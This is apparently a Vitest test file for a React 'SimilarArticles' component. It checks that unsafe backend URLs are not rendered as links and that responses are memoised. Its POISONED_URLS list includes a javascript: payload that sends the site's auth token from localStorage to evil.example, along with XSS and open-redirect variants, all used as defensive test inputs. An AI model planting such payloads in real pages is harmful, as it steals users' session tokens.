import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import { render, screen, waitFor } from '@testing-library/react'
import type { ComponentType } from 'react'

const POISONED_URLS = [
  "javascript:fetch('https://evil.example/?t='+localStorage.getItem('vccircle_auth_token'))",
  'JaVaScRiPt:alert(1)',
  'java\tscript:alert(1)',
  ' javascript:alert(1)',
  'data:text/html,<script>alert(1)</script>',
  '//evil/phish',
  '\\\\evil.com',
  '\\/evil.com',
]

interface ArticleListProps {
  articleId: number | string
  limit?: number
  compact?: boolean
}

// The component memoises successful responses in a module-level Map (#257), so
// its state outlives a single test. A static top-level import would bind one
// module instance for the whole file and the first case's result would be
// served to every later test. Each test therefore gets a freshly evaluated
// module, which is what actually gives it an empty memo.
let SimilarArticles: ComponentType<ArticleListProps>

beforeEach(async () => {
  vi.resetModules()
  vi.clearAllMocks()
  SimilarArticles = (await import('./SimilarArticles')).default
})

afterEach(() => {
  vi.unstubAllGlobals()
})

function mockSimilarArticles(urls: string[]) {
  const fetchMock = vi.fn().mockResolvedValue({
    ok: true,
    json: async () => ({
      similar_articles: urls.map((url, i) => ({
        id: 100 + i,
        title: `Article ${i}`,
        url,
        category: 'Deals',
      })),
    }),
  })
  vi.stubGlobal('fetch', fetchMock)
  return fetchMock
}

function renderAndWait(compact: boolean) {
  const view = render(<SimilarArticles articleId={1} compact={compact} />)
  return waitFor(() => expect(screen.getAllByText(/^Article \d$/).length).toBeGreaterThan(0)).then(
    () => view
  )
}

describe('SimilarArticles — unsafe backend URLs are not clickable', () => {
  it.each(POISONED_URLS)('compact list renders no link for %j', async (url) => {
    mockSimilarArticles([url])
    const { container } = await renderAndWait(true)

    expect(screen.getByText('Article 0')).toBeTruthy()
    expect(container.querySelectorAll('a[href]')).toHaveLength(0)
  })

  it.each(POISONED_URLS)('card list renders no link for %j', async (url) => {
    mockSimilarArticles([url])
    const { container } = await renderAndWait(false)

    expect(screen.getByText('Article 0')).toBeTruthy()
    expect(container.querySelectorAll('a[href]')).toHaveLength(0)
  })
})

describe('SimilarArticles — safe URLs still link out', () => {
  it('renders a working link for an absolute https URL', async () => {
    mockSimilarArticles(['https://vccircle.com/news/deal-1'])
    const { container } = await renderAndWait(false)

    const link = container.querySelector('a[href]')
    expect(link?.getAttribute('href')).toBe('https://vccircle.com/news/deal-1')
    expect(link?.getAttribute('rel')).toBe('noopener noreferrer')
  })

  it('renders a working link for a same-origin relative path', async () => {
    mockSimilarArticles(['/articles/42'])
    const { container } = await renderAndWait(false)

    expect(container.querySelector('a[href]')?.getAttribute('href')).toBe('/articles/42')
  })

  it('keeps safe articles linked when a sibling article is poisoned', async () => {
    mockSimilarArticles(['javascript:alert(1)', 'https://vccircle.com/news/ok'])
    const { container } = await renderAndWait(false)

    const links = container.querySelectorAll('a[href]')
    expect(links).toHaveLength(1)
    expect(links[0].getAttribute('href')).toBe('https://vccircle.com/news/ok')
  })
})

describe('SimilarArticles — a repeated id is not refetched (#257)', () => {
  it('fetches once and serves the second mount of the same id from the memo', async () => {
    const fetchMock = mockSimilarArticles(['https://vccircle.com/news/deal-1'])

    const first = await renderAndWait(false)
    expect(fetchMock).toHaveBeenCalledTimes(1)
    first.unmount()

    const { container } = await renderAndWait(false)

    expect(fetchMock).toHaveBeenCalledTimes(1)
    expect(container.querySelector('a[href]')?.getAttribute('href')).toBe(
      'https://vccircle.com/news/deal-1'
    )
  })

  it('treats a different limit as a different request', async () => {
    const fetchMock = mockSimilarArticles(['https://vccircle.com/news/deal-1'])

    const view = render(<SimilarArticles articleId={1} limit={3} compact />)
    await waitFor(() => expect(screen.getAllByText(/^Article \d$/).length).toBeGreaterThan(0))
    view.unmount()

    render(<SimilarArticles articleId={1} limit={7} compact />)
    await waitFor(() => expect(screen.getAllByText(/^Article \d$/).length).toBeGreaterThan(0))

    // Same id, different limit: the memo key includes the limit, so this is a
    // genuine second request rather than a cache hit.
    expect(fetchMock).toHaveBeenCalledTimes(2)
  })

  it('does not memoize a failed request, so a later mount can retry', async () => {
    const fetchMock = vi
      .fn()
      .mockResolvedValueOnce({ ok: false })
      .mockResolvedValue({
        ok: true,
        json: async () => ({
          similar_articles: [
            {
              id: 1,
              title: 'Article 0',
              url: 'https://vccircle.com/news/retry',
              category: 'Deals',
            },
          ],
        }),
      })
    vi.stubGlobal('fetch', fetchMock)

    const failed = render(<SimilarArticles articleId={1} compact />)
    await waitFor(() => expect(fetchMock).toHaveBeenCalledTimes(1))
    failed.unmount()

    render(<SimilarArticles articleId={1} compact />)
    await waitFor(() => expect(screen.getAllByText(/^Article \d$/).length).toBeGreaterThan(0))

    expect(fetchMock).toHaveBeenCalledTimes(2)
  })

  it('does not memoize an empty result, so a later mount can retry', async () => {
    // An empty `similar_articles` is a legitimate answer, not a failure, so it
    // has to reach the UI. Caching it as "nothing similar" would pin the empty
    // state for the life of the tab and the article would never light up even
    // after the index caught up.
    const fetchMock = vi
      .fn()
      .mockResolvedValueOnce({ ok: true, json: async () => ({ similar_articles: [] }) })
      .mockResolvedValue({
        ok: true,
        json: async () => ({
          similar_articles: [
            {
              id: 1,
              title: 'Article 0',
              url: 'https://vccircle.com/news/late',
              category: 'Deals',
            },
          ],
        }),
      })
    vi.stubGlobal('fetch', fetchMock)

    const empty = render(<SimilarArticles articleId={1} compact />)
    await waitFor(() => expect(fetchMock).toHaveBeenCalledTimes(1))
    empty.unmount()

    render(<SimilarArticles articleId={1} compact />)
    await waitFor(() => expect(screen.getAllByText(/^Article \d$/).length).toBeGreaterThan(0))

    expect(fetchMock).toHaveBeenCalledTimes(2)
  })
})
